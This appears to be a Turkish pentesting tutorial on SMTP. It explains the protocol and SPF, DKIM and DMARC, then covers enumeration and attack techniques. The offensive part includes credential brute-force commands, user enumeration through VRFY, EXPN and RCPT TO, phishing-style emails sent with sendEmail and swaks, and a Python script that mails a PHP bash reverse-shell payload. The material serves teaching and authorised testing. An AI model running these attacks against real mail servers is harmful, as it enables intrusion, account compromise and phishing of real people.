---
title: 25 - SMTP Pentesting
author: Acivik
date: 2023-01-12 15:30:00 +0300 
categories: [Pentesting, Enumeration, Protokoller]
tags: [SMTP, 25/tcp, enumeration, pentest, exploit, scan, protocols, protokoller]
---

# SMTP Nedir?

SMTP(Simple Mail Transfer Protocol), sunucular arasÄ±nda mail gÃ¶ndermek ve almak iÃ§in kullanÄ±lan TCP/IP protokolÃ¼dÃ¼r. AlÄ±cÄ± tarafÄ±nda mesajlarÄ± sÄ±raya koymak ve kaydetmek iÃ§in POP3(Post Office Protocol) veya IMAP(Internet Message Access Protocol) ile birlikte kullanÄ±lÄ±r.

# SMTP NasÄ±l Ã‡alÄ±ÅŸÄ±r?

Ä°lk olarak outlook, webmail gibi bir e-posta istemcisi mesaj gÃ¶ndermek iÃ§in SMTP kullanÄ±r ve mesajÄ± sunucuya gÃ¶nderir. Ä°kinci aÅŸamada gÃ¶nderen sunucu alÄ±cÄ± sunucuya SMTP kullanarak gÃ¶nderir. 

Son olarak alÄ±cÄ± istemci sunucudan POP3 veya IMAP kullanarak outlook, webmail gibi istemciler ile birlikte mesajlarÄ± alÄ±r.

![https://i.ibb.co/KhNVg2N/image.png](https://i.ibb.co/KhNVg2N/image.png)

Smtp client ve server arasÄ±ndaki konuÅŸma ÅŸu ÅŸekildedir.

![https://i.ibb.co/D4pgxm8/image.png](https://i.ibb.co/D4pgxm8/image.png)

ğŸŸ¢ Genellikle SMTP ProtokolÃ¼nÃ¼ 25, 465, 587, 2525, 2526 numaralÄ± portlarda gÃ¶rebiliriz.

**Mail User Agent (MUA):** E-posta gÃ¶ndermek iÃ§in SMTP sunucusuna baÄŸlanan bir programdÄ±r.

BÃ¼yÃ¼k olasÄ±lÄ±kla bu sizin Outlook'unuz vs. vs. olabilir.

**Mail Transfer Agent (MTA):** Bir programÄ±n aktarÄ±m hizmetidir. E-postalarÄ± alÄ±r ve aktarÄ±rlar. Bu bir Exchange sunucusu veya Ä°nternet'e yÃ¶nelik bir getway vb. olabilir.

### SMTP KomutlarÄ±:

`HELP`: Komutlar listelenir.

`HELO`: SMTP sunucusu ile SMTP iletiÅŸimi baÅŸlatÄ±lÄ±r.

`EHLO`: GeniÅŸletilmiÅŸ SMTP iletiÅŸimi iÃ§in kullanÄ±lÄ±r.

`AUTH`: Ä°stemcinin kimlik doÄŸrulamasÄ± iÃ§in kullanÄ±lÄ±r.

`MAIL` FROM: E-posta gÃ¶ndericisi belirtilir.

`RCPT TO`: E-posta alÄ±cÄ±sÄ± belirtilir.

`DATA`: E-postanÄ±n iÃ§eriÄŸi belirtilir. E-posta iÃ§eriÄŸi, â€œ.â€ ifadesi iÃ§eren satÄ±r ile tamamlanmÄ±ÅŸ olur.

`SUBJECT`: E-postanÄ±n konusu belirtilir.

`QUIT`: Oturum sonlandÄ±rÄ±lÄ±r.

`VRFY`: E-posta kutusu alÄ±cÄ±sÄ± doÄŸrulanÄ±r.

`EXPN`: E-posta listesi doÄŸrulanÄ±r.

`STARTTLS`: SMTP iletiÅŸimi TLS Ã¼zerinden baÅŸlatÄ±lÄ±r.

`RSET`: E-posta iletiÅŸimi kesilir.

# SPF(Sender Policy Framework) Nedir?

SPF kayÄ±tlarÄ±, kurumun domainini kullanarak hangi mail sunucularÄ±nÄ±n mail gÃ¶nderebileceÄŸini belirtebilen mekanizmalar saÄŸlar. SPF KayÄ±tlarÄ±nÄ± DNS Sunucusunu sorgulayarak gÃ¶rebiliriz. SPF kayÄ±tlarÄ±, mail spoofing ve phising saldÄ±rÄ±larÄ±nÄ± Ã¶nlemeyi amaÃ§lar.

![https://i.ibb.co/rscb40V/image.png](https://i.ibb.co/rscb40V/image.png)

Bir mekanizma ile eÅŸleÅŸildiÄŸinde ne yapÄ±lmasÄ±nÄ± belirten qualifications tanÄ±mlanÄ±r. Default olarak `+` kullanÄ±lÄ±r. Yani eÅŸleÅŸildiÄŸinde buna izin verir.

Genellikle SPF politikalarÄ±nÄ±n sonunda `~all` veya `-all` gÃ¶rÃ¼lÃ¼r. Bunun anlamÄ± gÃ¶nderen eÄŸer hiÃ§ bir politikayla eÅŸleÅŸmiyorsa gÃ¼venilmeyen(~) veya reddedilmesi(-) gerektiÄŸi ÅŸeklinde tanÄ±mlanmasÄ± iÃ§in kullanÄ±lÄ±r.

### Qualifiers

- `+` PASS â†’ SPF kaydÄ±, gÃ¶ndermesine izin verilecek ana bilgisayarÄ± belirtir.
- `?` NEUTRAL â†’ SPF kaydÄ±, geÃ§erlilik hakkÄ±nda hiÃ§bir ÅŸey sÃ¶ylenemeyeceÄŸini aÃ§Ä±kÃ§a belirtir.
- `~` SOFTFAIL â†’ SPF kaydÄ±, sunucunun gÃ¶ndermesine izin verilmediÄŸini, ancak geÃ§iÅŸ aÅŸamasÄ±nda olduÄŸunu belirtir.
- `-` FAIL â†’ SPF kaydÄ±, ana bilgisayarÄ± gÃ¶ndermesine izin verilmeyen olarak belirtir.

`nslookup` veya `dig` ile spf politikalarÄ± gÃ¶rÃ¼ntÃ¼lenebilir.

```bash
# nslookup -type=txt google.com | grep spf
google.com      text = "v=spf1 include:_spf.google.com ~all"

# nslookup -type=txt _netblocks.google.com | grep spf
_netblocks.google.com   text = "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

# nslookup -type=txt _netblocks2.google.com | grep spf
_netblocks2.google.com  text = "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"
```

# DKIM(DomainKeys Identified Mail) Nedir?

TÃ¼rkÃ§e karÅŸÄ±lÄ±ÄŸÄ± â€œAnahtarlarÄ±yla TanÄ±mlanmÄ±ÅŸ E-Postaâ€ dÄ±r. AmacÄ± phishing ve spamÄ± Ã¶nlemek iÃ§in mailin gerÃ§ekten baÄŸlÄ± olduÄŸu domainden gelip, gelmediÄŸini mail authentication yaparak yanÄ±tlamaktÄ±r.

DKIM Public keyi domain iÃ§in TXT kaydÄ±nda tutulur. Ancak kaydÄ± alabilmek iÃ§in selector ve domain adÄ±nÄ± bilmeniz gerekir. Ã–rneÄŸin: `d=gmail.com;s=20120113`

```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCg
KCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```

# DMARC Nedir?

Domain-based Message Authentication, Reporting & Conformance, Domain tabanlÄ± ileti kimlik doÄŸrulamasÄ±dÄ±r. E-posta gÃ¶ndericilerinin ve alÄ±cÄ±larÄ±nÄ±n doÄŸru kiÅŸi olup olmadÄ±ÄŸÄ±nÄ± ve izni olup olmadÄ±ÄŸÄ±nÄ± kontrol eden bir yapÄ±dÄ±r. DoÄŸrulama sonucunda ne tÃ¼r Ã¶nlem ve iÅŸlem yapacaÄŸÄ± belirlenir.

Domain iÃ§in e-postanÄ±n nasÄ±l iÅŸleneceÄŸini ve gerÃ§ekleÅŸtirilen eylemlerin nasÄ±l raporlanacaÄŸÄ±nÄ± tanÄ±mlar.

![https://i.ibb.co/nfJ4rm9/image.png](https://i.ibb.co/nfJ4rm9/image.png)

DMARC kaydÄ±nÄ± elde etmek iÃ§in _dmarc alt alan adÄ±nÄ± sorgulamanÄ±z gerekir.

![https://i.ibb.co/Sd397Ft/image.png](https://i.ibb.co/Sd397Ft/image.png)

PayPal ve Yahoo, posta sunucularÄ±na geÃ§ersiz DKIM imzalarÄ± iÃ§eren veya kendi aÄŸlarÄ±ndan gelmeyen iletileri reddetme talimatÄ± verir. Bildirimler daha sonra her kuruluÅŸ iÃ§indeki ilgili e-posta adreslerine gÃ¶nderilir. 

Google, posta sunucularÄ±na iletileri karantinaya almalarÄ± ve doÄŸrudan reddetmemeleri talimatÄ±nÄ± vermesine raÄŸmen benzer ÅŸekilde yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r.

| TAG AdÄ± | AmacÄ± | Ã–rnek |
| --- | --- | --- |
| v | Protokol Versiyon | v=DMARC1 |
| pct | Filtrelemeye tabi tutulan iletilerin yÃ¼zdesi | pct=20 |
| ruf | forensic raporlarÄ± iÃ§in raporlama URI'si | ruf=mailto:<nolink>authfail@example.com</nolink> |
| rua | Toplu raporlarÄ±n raporlama URI'si | rua=mailto:<nolink>authfail@example.com</nolink> |
| p | KuruluÅŸ domain iÃ§in politika | p=quarantine |
| sp | OD'nin subdomains iÃ§in politika | sp=reject |
| adkimadkim | DKIM iÃ§in alignment modu | adkim=s |
| aspf | SPF iÃ§in alignment modu | aspf=r |

- [https://github.com/serain/mailspoof](https://github.com/serain/mailspoof) SPF ve DMARC yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ±nÄ± kontrol edin
- [https://pypi.org/project/checkdmarc/](https://pypi.org/project/checkdmarc/) SPF ve DMARC yapÄ±landÄ±rmalarÄ±nÄ± otomatik olarak alma

### Spoofing Kontrol Etmek

Spoofing yapÄ±labilir mi, e-postamÄ±za ulaÅŸÄ±labilir mi? Bunu kontrol etmek iÃ§in online araÃ§ kullanabiliriz. [http://www.anonymailer.net/](http://www.anonymailer.net/)

### DiÄŸer Phishing Belirtileri

- Domain yaÅŸÄ±.
- IP Adresi iÅŸaret eden linkler.
- Link manipÃ¼lasyonlarÄ±.
- ÅÃ¼pheli attachments.
- GeÃ§erli ve gÃ¼venilir bir SSL sertifikasÄ±nÄ±n varlÄ±ÄŸÄ±.

# SMTP PorotokolÃ¼ne YÃ¶nelik SÄ±zma Testi

```bash
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
```

## Shodan AramasÄ±

| ![https://www.shodan.io/static/img/favicon.png](https://www.shodan.io/static/img/favicon.png) [Shodan Arama Sorgusu](https://www.shodan.io/search?query=port%3A25%2C465%2C587%2C2525%2C2526) |
| --- |
|`port:25,465,587,2525,2526`|

## Banner Grabbing / SMTP BaÄŸlanma

```bash
#SMTP
telnet 10.10.11.101 25
nc -nv 10.10.11.101 25
nmap -sV --script=banner 10.10.11.101 -p 25

#SMTPS
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```

![https://i.ibb.co/TTccBQz/image.png](https://i.ibb.co/TTccBQz/image.png)

## Bir KuruluÅŸun MX SunucularÄ±nÄ± Bulma

```bash
dig +short mx google.com
```

## Desteklenen KomutlarÄ± Bulma

```bash
nmap -p25 10.10.11.101 -sV --script=smtp-commands

#EÄŸer Server NTLM auth Destekliyorsa
nmap -sV --script=smtp-ntlm-info 10.10.11.101 -p 25
```

```bash
root@kali: telnet example.com 587 
220 example.com SMTP Server Banner 
>> HELO 
250 example.com Hello [x.x.x.x] 
>> AUTH NTLM 334 
NTLM supported 
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= 
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```

## User Enumeration

### Kimlik Bilgileri Ä°Ã§in Brute Force

```bash
hydra -L userlist.txt -P passlist.txt 10.10.11.101 smtp
ncrack -p 25 -U userlist.txt -P passwords.txt 10.10.11.101
medusa -U userlist.txt -P passlist.txt -h 10.10.11.101 -M smtp
```

### KullanÄ±cÄ±larÄ± Bulmak Ä°Ã§in Brute Force

```bash
smtp-user-enum -M VRFY -U userlist.txt -t 10.10.11.101
nmap -sV --script smtp-enum-users 10.10.11.101 -p 2
msf6 > use auxiliary/scanner/smtp/smtp_enum
```

![https://i.ibb.co/zfyGb0g/image.png](https://i.ibb.co/zfyGb0g/image.png)

### RCPT TO

```bash
$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
MAIL FROM:test@test.org
250 2.1.0 test@test.org... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```

### VRFY

```bash
$ telnet 10.0.0.1 25
Trying 10.0.0.1...
Connected to 10.0.0.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
VRFY root
250 Super-User <root@myhost>
VRFY blah
550 blah... User unknown
```

### EXPN

```bash
$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 <ed.williams@myhost>
EXPN sshd
250 2.1.5 sshd privsep <sshd@mail2>
```

## Linux Konsolundan Email GÃ¶ndermek

```bash
root@kali:~# sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
  - First line must be received within 60 seconds.
  - End manual input with a CTRL-D on its own line.

IT Dept,

We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.

Sincerely,
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```

## Python Scripti ile Email GÃ¶ndermek

```bash
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = "" 
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload 
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
    print("[-]Connection Error")
    exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
